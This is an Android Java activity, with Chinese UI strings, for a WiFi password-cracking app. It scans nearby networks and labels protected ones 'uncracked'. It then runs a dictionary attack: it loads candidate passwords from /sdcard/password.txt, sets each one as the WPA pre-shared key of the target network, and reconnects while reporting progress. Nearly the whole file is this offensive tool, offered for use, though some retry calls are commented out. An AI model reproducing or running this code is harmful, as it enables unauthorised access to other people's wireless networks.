package com.wifi.android.runwifipassword;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.ScanResult;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.preference.Preference;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.wifi.android.runwifipassword.util.AccessPoint;
import com.wifi.android.runwifipassword.util.CopyData_File;
import com.wifi.android.runwifipassword.util.PasswordGetter;
import com.wifi.android.runwifipassword.view.PinnedSectionListView;

import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class WifiCrackActivity extends Activity {

    PinnedSectionListView listView;
    private List<WifiPo> listData;
    private WifiManager wifimanager;
    private WifiInfo connectionInfo;
    private List<ScanResult> scanResults;
    private List<WifiConfiguration> configuredNetworks;
    private List<WifiPo> myWifi;
    private List<WifiPo> crackWifi;
    private List<WifiPo> openWifi;
    public static final String WIFI_AUTH_OPEN = "";
    public static final String WIFI_AUTH_ROAM = "[ESS]";
    public static final String WIFI_AUTH_WPS = "[WPS][ESS]";
    private Comparator<WifiPo> comparator;
    private WifiConfiguration mConfig;
    private LinearLayout linearLayout01;
    private RelativeLayout relativeLayout;
    private LinearLayout linearLayout02;
    private TextView forget;
    private listViewAdaper adapter;
    private WifiReceiver wifiReceiver;
    private AccessPoint ap;
    private AccessPoint tmpap;
    private String password;
    private boolean cracking;
    private int netid;
    private int netids;
    private static final String TAG = "chuangguo.qi";
    List<ScanResult> results;
    ScanResult result;
    private int nowid = 0;
    private PasswordGetter passwordGetter;
    ScanResult scanResult = null;
    private String crackWifiSSID;
    private int posint =0;
    private TextView strengt_tv;
    private TextView tvName;
    private TextView classify_tv;
    private ProgressBar progressBar1;
    private View dialogView;
    private TextView tv_title;
    private ProgressBar progressBar;
    private TextView tv_present;
    private TextView tv_progress;
    private Button button;
    private AlertDialog.Builder crackBuilder;
    private AlertDialog dialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        CopyData_File co = new CopyData_File(this);
        co.DoCopy();
        setContentView(R.layout.activity_wifi_crack);
        cracking = false;
        netid = -1;
        try {
            passwordGetter = new PasswordGetter("/sdcard/password.txt");
        } catch (FileNotFoundException e) {
            showMessageDialog("程序初始化失败", "sd卡错误无法初始化密码字典，请检查sd卡", "确定", false,
                    new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            //WIFICracker.this.finish();
                        }
                    });
        }
        //初始化wifi管理器
        wifimanager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
        wifiReceiver = new WifiReceiver();
        IntentFilter intentFilter = new IntentFilter(
                WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
        intentFilter.addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION);
        intentFilter.addAction(WifiManager.RSSI_CHANGED_ACTION);
        intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
        registerReceiver(wifiReceiver, intentFilter);
        getwifiData();
        initView();
        initDialogView();
        initData();
        getData();
    }

    private void initDialogView() {

        dialogView = LayoutInflater.from(WifiCrackActivity.this).inflate(R.layout.dialog_view,null,false);
        tv_title = (TextView) dialogView.findViewById(R.id.tv_title);
        progressBar = (ProgressBar) dialogView.findViewById(R.id.progressBar);
        tv_present = (TextView) findViewById(R.id.tv_present);
        tv_progress = (TextView) findViewById(R.id.tv_progress);
        button = (Button) dialogView.findViewById(R.id.button);

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

               dialog.dismiss();
            }
        });

    }

    /**
     * 获取wifi列表
     */
    public void getwifiData(){
        wifimanager.startScan();
        connectionInfo = wifimanager.getConnectionInfo();
        scanResults = wifimanager.getScanResults();
        configuredNetworks = wifimanager.getConfiguredNetworks();
    }

    /**
     * 初始化数据
     */
    private void initData() {
        listData = new ArrayList<WifiPo>();
        myWifi = new ArrayList<WifiPo>();
        crackWifi = new ArrayList<WifiPo>();
        openWifi = new ArrayList<WifiPo>();

        comparator = new Comparator<WifiPo>() {
            @Override
            public int compare(WifiPo wifiPo, WifiPo t1) {
                int leve1=0;
                int leve2=0;
                try {
                    if (wifiPo.getStrength()==null){

                        leve1 = Integer.parseInt("0");
                    }else {

                        leve1 = Integer.parseInt(wifiPo.getStrength());
                    }

                    if (t1.getStrength()==null){
                        leve2 = Integer.parseInt("0");
                    }else {

                        leve2 = Integer.parseInt(t1.getStrength());
                    }
                }catch (Exception e){

                    e.printStackTrace();
                }

                if (leve1 > leve2) {
                    return -1;
                } else if (leve1 < leve2) {

                    return 1;
                } else {
                    return 0;
                }
            }
        };





    }


    public void getData() {

        myWifi.clear();
        openWifi.clear();
        crackWifi.clear();
        listData.clear();
        if (scanResults == null) {
            return;
        }

        FIFL:
        for (int i = 0; i < scanResults.size(); i++) {

            WifiPo wifipo = new WifiPo();
            String scanSSID = scanResults.get(i).SSID;
            if (scanSSID.length() < 1) {
                continue;
            }

            int level = WifiManager.calculateSignalLevel(scanResults.get(i).level,
                    100);
            String capabilities = scanResults.get(i).capabilities.trim();

            if (capabilities != null && (capabilities.equals(WIFI_AUTH_OPEN) || capabilities.equals(WIFI_AUTH_ROAM) || capabilities.equals(WIFI_AUTH_WPS))) {
                wifipo.setState(2);
                wifipo.setName(scanResults.get(i).SSID);
                wifipo.setType(1);
                wifipo.setStrength(String.valueOf(Math.abs(level)));
                openWifi.add(wifipo);
                continue FIFL;
            }

            for (int j = 0; j < configuredNetworks.size(); j++) {
                String confguredSSID = configuredNetworks.get(j).SSID;

                if (confguredSSID.length() < 1) {
                    break;
                }
                confguredSSID = confguredSSID.substring(1, confguredSSID.length() - 1);
                if (scanSSID.equals(confguredSSID)) {
                    wifipo.setState(1);
                    wifipo.setName(scanResults.get(i).SSID);
                    wifipo.setType(1);
                    wifipo.setStrength(String.valueOf(Math.abs(level)));
                    myWifi.add(wifipo);
                    continue FIFL;
                } else {
                    wifipo.setState(0);
                }
            }
            wifipo.setName(scanResults.get(i).SSID);
            wifipo.setType(1);
            wifipo.setStrength(String.valueOf(Math.abs(level)));
            crackWifi.add(wifipo);
        }

        if (myWifi.size() > 0) {
            Collections.sort(myWifi, comparator);
        }
        if (crackWifi.size() > 0) {
            Collections.sort(crackWifi, comparator);
        }
        if (openWifi.size() > 0) {
            Collections.sort(openWifi, comparator);
        }

        WifiPo wifi = new WifiPo();
        wifi.setName("我的wifi");
        wifi.setType(0);
        myWifi.add(0, wifi);
        if (myWifi.size() >= 2) {
            listData.addAll(myWifi);
        }

        WifiPo wifi3 = new WifiPo();
        wifi3.setName("开放wifi");
        wifi3.setType(0);
        openWifi.add(0, wifi3);
        if (openWifi.size() >= 2) {
            listData.addAll(openWifi);
        }

        WifiPo wifi2 = new WifiPo();
        wifi2.setName("未破解wifi");
        wifi2.setType(0);
        crackWifi.add(0, wifi2);
        if (crackWifi.size() >= 2) {
            listData.addAll(crackWifi);
        }

        adapter.notifyDataSetChanged();

    }

    /***
     * 初始化View
     */
    private void initView() {

        listView = (PinnedSectionListView) findViewById(R.id.listView);
        adapter = new listViewAdaper();
        listView.setAdapter(adapter);
        linearLayout01 = (LinearLayout) findViewById(R.id.linear01);
        relativeLayout = (RelativeLayout) findViewById(R.id.relative);
        linearLayout02 = (LinearLayout) findViewById(R.id.linear02);

        strengt_tv = (TextView) findViewById(R.id.strengt_tv);
        tvName = (TextView) findViewById(R.id.tv);
        classify_tv = (TextView) findViewById(R.id.classify_tv);
        forget = (TextView) findViewById(R.id.forget);

        progressBar1 = (ProgressBar) findViewById(R.id.progressBar1);

        layoutvisibility(View.GONE);





        forget.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                wifimanager.removeNetwork(netids);
                wifimanager.saveConfiguration();
                layoutvisibility(View.GONE);
                getwifiData();
                getData();
            }
        });

        listView.setShadowVisible(false);

        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {


            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                Log.i(TAG, "onItemClick: " + listData.get(i).getName());
                posint=i;
                int state = listData.get(i).getState();
                mConfig = new WifiConfiguration();
                if (state == 0) {//破解
                    crackBuilder = new AlertDialog.Builder(WifiCrackActivity.this);
                    crackBuilder.setView(dialogView);
                    tv_title.setText("正在准备加载。。。");
                    crackWifiSSID=listData.get(i).getName();
                    dialog = crackBuilder.show();
                    crackBuilder.setCancelable(false);
                    update();

                } else if (state == 1) {//我的
                    if (wifimanager.getConnectionInfo().getSSID().equals("\""+listData.get(i).getName()+"\"")) {
                        return;
                    }else {
                        mConfig = isExsits(listData.get(i).getName());
                        if (mConfig == null) {
                            return;
                        }

                        layoutvisibility(View.VISIBLE);
                        progressBar1.setVisibility(View.VISIBLE);
                        tvName.setText(listData.get(i).getName());
                        classify_tv.setText("正在连接");
                        strengt_tv.setText(WifiManager.calculateSignalLevel(Integer.parseInt(listData.get(i).getStrength()),100)+"%");
                        wifimanager.enableNetwork(mConfig.networkId, true);
                        wifimanager.saveConfiguration();
                    }

                } else if (state == 2) {//无需

                    mConfig.SSID = AccessPoint.convertToQuotedString(listData.get(i).getName());
                    mConfig.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
                    wifimanager.enableNetwork(wifimanager.addNetwork(mConfig), true);
                    wifimanager.saveConfiguration();
                }




            }
        });
    }

    public class listViewAdaper extends BaseAdapter implements PinnedSectionListView.PinnedSectionListAdapter {


        @Override
        public int getCount() {
            if (listData != null) {
                return listData.size();
            }
            return 0;
        }

        @Override
        public Object getItem(int i) {
            return listData.get(i);
        }

        @Override
        public long getItemId(int i) {
            return i;
        }

        @Override
        public View getView(int i, View view, ViewGroup viewGroup) {
            ViewHold hold = null;
            if (view == null) {
                hold = new ViewHold();
                if (listData.get(i).getType() == 0) {
                    view = LayoutInflater.from(WifiCrackActivity.this).inflate(R.layout.listview_item_title, null, false);
                    hold.title_tv = (TextView) view.findViewById(R.id.titile_tv);
                    view.setTag(hold);
                } else {
                    view = LayoutInflater.from(WifiCrackActivity.this).inflate(R.layout.listview_item, null, false);
                    hold.textView = (TextView) view.findViewById(R.id.tv);
                    hold.strengt_tv = (TextView) view.findViewById(R.id.strengt_tv);
                    hold.classify_tv = (TextView) view.findViewById(R.id.classify_tv);
                    view.setTag(hold);
                }
            } else {

                hold = (ViewHold) view.getTag();
            }

            WifiPo wifipo = listData.get(i);
            if (listData.get(i).getType() == 0) {
                hold.title_tv.setText(wifipo.getName());
            } else {
                hold.textView.setText(wifipo.getName());
                hold.strengt_tv.setText(wifipo.getStrength() + "%");
                if (listData.get(i).getState() == 1) {
                    hold.classify_tv.setText("已保存");

                } else if (listData.get(i).getState() == 0) {
                    hold.classify_tv.setText("需密码");
                } else if (listData.get(i).getState() == 2) {
                    hold.classify_tv.setText("开放wifi,可直接连接");

                }
            }

            return view;
        }

        @Override
        public int getItemViewType(int position) {
            return listData.get(position).getType();
        }

        @Override
        public int getViewTypeCount() {
            return 2;
        }

        @Override
        public boolean isItemViewTypePinned(int viewType) {
            return listData.get(viewType).getType() == 0 ? true : false;
        }

        class ViewHold {

            TextView textView, title_tv, strengt_tv, classify_tv;
        }
    }

    private WifiConfiguration isExsits(String ssid) {

        List<WifiConfiguration> configuredNetworks = wifimanager.getConfiguredNetworks();
        for (WifiConfiguration configure : configuredNetworks) {

            if (configure.SSID.equals("\"" + ssid + "\"")) {

                return configure;
            }
        }
        Log.i(TAG, "isExsits: null");
        return null;
    }

    public void layoutvisibility(int visibility){

        linearLayout01.setVisibility(visibility);
        linearLayout02.setVisibility(visibility);
        relativeLayout.setVisibility(visibility);
    }


    class WifiReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (WifiManager.SCAN_RESULTS_AVAILABLE_ACTION.equals(action)) {
                if (results == null) // 只初始化一次
                    results = wifimanager.getScanResults();
                try {

                } catch (Exception e) {
                    e.printStackTrace();
                }
                if (cracking){
                    Log.i(TAG, "onReceive: "+"不更新界面");
                    update();
                }

            } else if (WifiManager.SUPPLICANT_STATE_CHANGED_ACTION
                    .equals(action)) {
                WifiInfo info = wifimanager.getConnectionInfo();
                SupplicantState state = info.getSupplicantState();
                String str = null;
                if (state == SupplicantState.ASSOCIATED) {
                    nowid++;
                    str = "关联AP完成";
                } else if (state.toString().equals("AUTHENTICATING")) {
                    if (password!=null && password.length()>0) {
                        str = "正在验证密码" + AccessPoint.removeDoubleQuotes(password);
                    }
                } else if (state == SupplicantState.ASSOCIATING) {
                    str = "正在关联AP...";
                } else if (state == SupplicantState.COMPLETED) {
                    if (cracking) {
                        cracking = false;
                        return;
                    } else
                        str = "已连接";
                    passwordGetter.reSet();
                } else if (state == SupplicantState.DISCONNECTED) {
                    str = "已断开";

                } else if (state == SupplicantState.DORMANT) {
                    str = "暂停活动";
                } else if (state == SupplicantState.FOUR_WAY_HANDSHAKE) {
                    if (password!=null && password.length()>0) {
                        str = "破解密码中.." + AccessPoint.removeDoubleQuotes(password)
                                + "  破解进行到第" + nowid + "个";
                    }
                } else if (state == SupplicantState.GROUP_HANDSHAKE) {
                    str = "GROUP_HANDSHAKE";
                } else if (state == SupplicantState.INACTIVE) {
                    str = "休眠中...";
                    if (cracking){}
                        //connectNetwork(); // 连接网络
                } else if (state == SupplicantState.INVALID) {
                    str = "无效";
                } else if (state == SupplicantState.SCANNING) {
                    str = "扫描中...";
                } else if (state == SupplicantState.UNINITIALIZED) {
                    str = "未初始化";
                }
                Log.i(TAG, "onReceive: "+str);
                final int errorCode = intent.getIntExtra(
                        WifiManager.EXTRA_SUPPLICANT_ERROR, -1);
                if (errorCode == WifiManager.ERROR_AUTHENTICATING) {
                    Log.i(TAG, "WIFI验证失败！");
                    if (listData.get(posint).getState()==1) {
                        layoutvisibility(View.GONE);
                        wifimanager.removeNetwork(mConfig.networkId);
                        wifimanager.saveConfiguration();
                        getwifiData();
                        getData();
                        adapter.notifyDataSetChanged();
                        AlertDialog.Builder builder = new AlertDialog.Builder(WifiCrackActivity.this);
                        builder.setTitle("提示");
                        builder.setMessage("WIFI验证失败！你可以在列表中进行破解。");
                        builder.setNegativeButton("我知道了",null).create().show();
                    }
                    if (cracking == true){}
                        //connectNetwork();
                }
            }


        }
    }

    private void connectNetwork() {

        if (cracking) {
            ap.mConfig.priority = 1;
            ap.mConfig.status = WifiConfiguration.Status.ENABLED;
            password = passwordGetter.getPassword(); // 从外部字典加载密码
            Log.i(TAG, "password: --------"+password);
            if (password == null || password.length() == 0) {
                setTitle("抱歉强密码难以破解，常规密码本已猜解完毕，没有跑出密码！请等待升级版本在来试下");
                cracking = false;
                return;
            }
            password = "\"" + password + "\"";
            ap.mConfig.preSharedKey = password; // 设置密码
            Log.d(TAG, ap.toString());
            if (netid == -1) {
                netid = wifimanager.addNetwork(ap.mConfig);
                ap.mConfig.networkId = netid;
                Log.i(TAG, "添加AP失败");
            } else
                wifimanager.updateNetwork(ap.mConfig);
            setTitle("尝试连接:" + ap.mConfig.SSID + "密码:"
                    + ap.mConfig.preSharedKey);
            // enableNetwork、saveConfiguration、reconnect为connectNetwork的实现
            if (wifimanager.enableNetwork(netid, true)){
                Log.i(TAG, "connectNetwork: 启用网络失败");
            }
            wifimanager.saveConfiguration();
            wifimanager.reconnect(); // 连接AP
            Log.i(TAG, "connectNetwork: "+"连接中。。。。。");
        }
    }

    public void update(){

        if (results==null){

            return;
        }
        if (scanResult==null) {
            for (int i = 0; i < results.size(); i++) {
                scanResult = results.get(i);
                if (scanResult.SSID.equals(crackWifiSSID)) {
                    break;
                }
            }
        }else {

            tmpap = new AccessPoint(this, scanResult);
            checkAP();
            return;
        }
        if (scanResult!=null) {
            tmpap = new AccessPoint(this, scanResult);
            Log.i(TAG, "update: "+scanResult.SSID);
            checkAP();
        }
    }

    private void checkAP() {

        if (tmpap.security == AccessPoint.SECURITY_NONE) {
            setTitle("该AP没有加密，不需要破解！");
            return;
        } else if ((tmpap.security == AccessPoint.SECURITY_EAP)
                || (tmpap.security == AccessPoint.SECURITY_WEP)) {
            setTitle("暂不支持EAP与WEP加密方式的破解！");
            return;
        }

        showMessageDialog("WIFI热点信息", tmpap.toString(), "破解", true,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        scanResult=null;
                        cracking = true;
                        setTitle("正在破解...");
                        try {
                            ap = tmpap;
                            connectNetwork(); // 连接网络
                            //enablePreferenceScreens(false);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });

    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(wifiReceiver);
    }
    private void showMessageDialog(String title, String message,
                                   String positiveButtonText, boolean bShowCancel,
                                   DialogInterface.OnClickListener positiveButtonlistener) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);
        builder.setMessage(message);
        builder.setPositiveButton(positiveButtonText, positiveButtonlistener);
        if (bShowCancel) {
            builder.setNegativeButton("取消", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                }
            });
        }
        builder.create().show();
    }


}
